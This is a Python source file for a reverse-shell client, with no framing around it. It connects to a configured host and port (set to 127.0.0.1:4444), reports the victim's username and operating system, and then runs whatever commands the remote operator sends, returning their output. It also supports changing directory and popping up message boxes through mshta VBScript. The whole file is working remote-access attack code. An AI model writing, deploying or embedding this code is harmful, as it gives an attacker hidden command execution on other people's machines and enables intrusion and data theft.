import os
import sys
from getpass import getuser
from socket import *
import subprocess
import platform

host = "127.0.0.1"
port = 4444

def send_message(connection, message):
    try:
        message = message.encode()
        message_length = len(message)
        connection.sendall(str(message_length).zfill(10).encode())
        connection.sendall(message)
    except Exception as e:
        print(f"Error sending message: {e}")
        sys.exit()

def receive_full_message(connection):
    try:
        message_length = int(connection.recv(10).decode())
        data = b''
        while len(data) < message_length:
            packet = connection.recv(message_length - len(data))
            if not packet:
                return None
            data += packet
        return data.decode()
    except ValueError:
        return None

get_os = platform.uname()[0]
get_user = getuser()
os_info = "Name: "+str(get_user)+" <-> "+"OS: "+str(get_os)

connection = socket(AF_INET, SOCK_STREAM)
connection.connect((host, port))

current_directory = os.getcwd()

send_message(connection, os_info)
send_message(connection, f"DIR:{current_directory}")

while True:
    try:
        receiver = receive_full_message(connection)
        if receiver is None:
            print("Connection closed by the server")
            break

        if receiver in ["exit", "quit", 'q']:
            sys.exit()
        elif receiver[:2] == "cd":
            os.chdir(receiver[3:])
            current_directory = os.getcwd()
            send_message(connection, f"DIR:{current_directory}")
        elif receiver == "getcwd":
            current_directory = os.getcwd()
            send_message(connection, f"DIR:{current_directory}")
        elif receiver.startswith("msgbox"):
            try:
                _, msg, title = receiver.split('"')
                vbscript_command = f'mshta vbscript:Execute("msgbox ""{msg}"", 64, ""{title}"":close")'
                os.system(vbscript_command)
                send_message(connection, "MessageBox displayed")
            except Exception as e:
                send_message(connection, f"Error: {str(e)}" + '\nExample usage: msgbox "test"')
        else:
            try:
                output = subprocess.getoutput(receiver)
                current_directory = os.getcwd()
                send_message(connection, f"DIR:{current_directory}\n{output}" if output else f"DIR:{current_directory}\nNo output")
            except Exception as e:
                current_directory = os.getcwd()
                send_message(connection, f"DIR:{current_directory}\nCommand execution error: {e}")
    except Exception as e:
        print(f"Error receiving data: {e}")
        sys.exit()
